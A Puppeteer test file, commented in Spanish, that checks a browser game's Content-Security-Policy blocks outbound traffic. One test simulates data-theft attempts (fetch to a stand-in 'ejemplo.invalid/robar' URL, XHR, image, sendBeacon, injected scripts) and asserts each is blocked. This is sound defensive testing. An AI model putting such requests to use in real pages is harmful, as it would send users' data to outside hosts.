// Privacidad y seguridad: el juego no manda nada a ningún lado y la política de seguridad (CSP) lo impide además por construcción.
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer-core');
const { iniciar, dormir, buscarChrome } = require('./ayudas');

let B;
test.before(async () => { B = await iniciar(); });
test.after(async () => { await B.cerrar(); });

const RAIZ = path.join(__dirname, '..', '..');

test('la página trae una política de seguridad que corta toda conexión de salida', () => {
  const html = fs.readFileSync(path.join(RAIZ, 'index.html'), 'utf8');
  const csp = /http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html);
  assert.ok(csp, 'falta la política de seguridad');
  assert.match(csp[1], /default-src 'none'/);
  assert.match(csp[1], /connect-src 'none'/);
  assert.match(csp[1], /script-src 'self'/);
  assert.ok(!/script-src[^;]*'unsafe-inline'/.test(csp[1]), 'los programas no pueden ser en línea en la versión de varios archivos');
  assert.ok(!/https?:/.test(csp[1]), 'no se autoriza ningún sitio de afuera');
});

test('con la política puesta, una partida completa no genera ninguna violación ni pide nada afuera', async () => {
  const page = await B.pagina({ antes: (p) => p.evaluateOnNewDocument(() => { window.__violaciones = []; document.addEventListener('securitypolicyviolation', (e) => window.__violaciones.push(e.violatedDirective + ' ' + e.blockedURI)); }) });
  const pedidos = [];
  page.on('request', (r) => pedidos.push(r.url()));
  await page.evaluate(() => { RE.ui.estado.ops.nombre = 'Ana'; RE.ui.estado.ops.modo = 'corto'; RE.ui.ir('inicio'); });
  await page.click('#botonComenzar'); await dormir(200);
  for (let guardia = 0; guardia < 60; guardia++) {
    const p = await page.evaluate(() => RE.ui.estado.pantalla);
    if (p === 'desafio') break;
    if (p === 'intro') await page.click('#botonEstacion');
    else if (p === 'estacion') await page.click('#botonContinuar');
    else if (p === 'pregunta') {
      const r = await page.evaluate(() => { const P = RE.ui.estado.partida; return { ya: P.respondida, c: RE.motor.actual(P).correcta }; });
      if (!r.ya) await page.click('.respuesta[data-i="' + r.c + '"]');
      await dormir(100); await page.click('#botonSiguiente');
    }
    await dormir(120);
  }
  await page.evaluate(() => { const P = RE.ui.estado.partida; P.desafio.items.forEach((it) => RE.motor.resolverLugar(P, it.id, it.depto)); RE.ui.finalizar(); });
  await dormir(300);
  await page.evaluate(() => RE.ui.abrirCreditos()); await dormir(200); await page.keyboard.press('Escape');
  await page.evaluate(() => { URL.createObjectURL(new Blob(['x'])); });
  const r = await page.evaluate(() => window.__violaciones);
  assert.deepEqual(r, []);
  const afuera = pedidos.filter((u) => !u.startsWith(B.servidor.url) && !u.startsWith('data:') && !u.startsWith('blob:'));
  assert.deepEqual(afuera, []);
  assert.deepEqual(page.errores, []);
  await page.cerrarContexto();
});

test('aunque un programa lo intentara, la política bloquea fetch, XMLHttpRequest, imágenes y envíos a otro sitio', async () => {
  const page = await B.pagina({ antes: (p) => p.evaluateOnNewDocument(() => { window.__violaciones = []; document.addEventListener('securitypolicyviolation', (e) => window.__violaciones.push(e.violatedDirective + ' ' + e.blockedURI)); }) });
  const r = await page.evaluate(async () => {
    const res = {};
    try { await fetch('https://ejemplo.invalid/robar?x=1'); res.fetch = 'salió'; } catch (e) { res.fetch = 'bloqueado'; }
    res.xhr = await new Promise((ok) => { try { const x = new XMLHttpRequest(); x.open('GET', 'https://ejemplo.invalid/'); x.onerror = () => ok('bloqueado'); x.onload = () => ok('salió'); x.send(); } catch (e) { ok('bloqueado'); } });
    res.img = await new Promise((ok) => { const i = new Image(); i.onload = () => ok('salió'); i.onerror = () => ok('bloqueado'); i.src = 'https://ejemplo.invalid/p.png'; });
    if (navigator.sendBeacon) navigator.sendBeacon('https://ejemplo.invalid/b', 'x'); // devuelve true porque lo encola; la política lo corta al enviarlo
    await new Promise((ok) => setTimeout(ok, 150));
    res.beacon = window.__violaciones.some((v) => v.startsWith('connect-src') && v.includes('ejemplo.invalid/b')) ? 'bloqueado' : 'salió';
    res.script = await new Promise((ok) => { const s = document.createElement('script'); s.src = 'https://ejemplo.invalid/s.js'; s.onerror = () => ok('bloqueado'); s.onload = () => ok('salió'); document.head.appendChild(s); });
    res.enLinea = await new Promise((ok) => { window.__ejecutado = false; const s = document.createElement('script'); s.textContent = 'window.__ejecutado = true'; document.head.appendChild(s); setTimeout(() => ok(window.__ejecutado ? 'ejecutó' : 'bloqueado'), 100); });
    return res;
  });
  assert.deepEqual(r, { fetch: 'bloqueado', xhr: 'bloqueado', img: 'bloqueado', beacon: 'bloqueado', script: 'bloqueado', enLinea: 'bloqueado' });
  await page.cerrarContexto();
});

test('el archivo único también cumple: sin conexiones de salida y sin violaciones', async () => {
  const navegador = await puppeteer.launch({ executablePath: buscarChrome(), args: ['--no-sandbox'] });
  try {
    const page = await navegador.newPage();
    await page.evaluateOnNewDocument(() => { window.__violaciones = []; document.addEventListener('securitypolicyviolation', (e) => window.__violaciones.push(e.violatedDirective + ' ' + e.blockedURI)); });
    const errores = [];
    page.on('pageerror', (e) => errores.push(e.message));
    await page.setViewport({ width: 1920, height: 1080 });
    await page.goto('file://' + path.join(RAIZ, 'dist', 'ruta-de-la-energia.html'), { waitUntil: 'load' });
    await dormir(450); // el antirrebote ignora los toques durante los primeros 0,3 segundos
    await page.click('#botonComenzar'); await dormir(200);
    const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]').content);
    assert.match(csp, /connect-src 'none'/);
    const ext = await page.evaluate(async () => { try { await fetch('https://ejemplo.invalid/'); return 'salió'; } catch (e) { return 'bloqueado'; } });
    assert.equal(ext, 'bloqueado');
    assert.deepEqual(await page.evaluate(() => window.__violaciones.filter((v) => !/connect-src/.test(v))), []);
    assert.deepEqual(errores, []);
  } finally { await navegador.close(); }
});
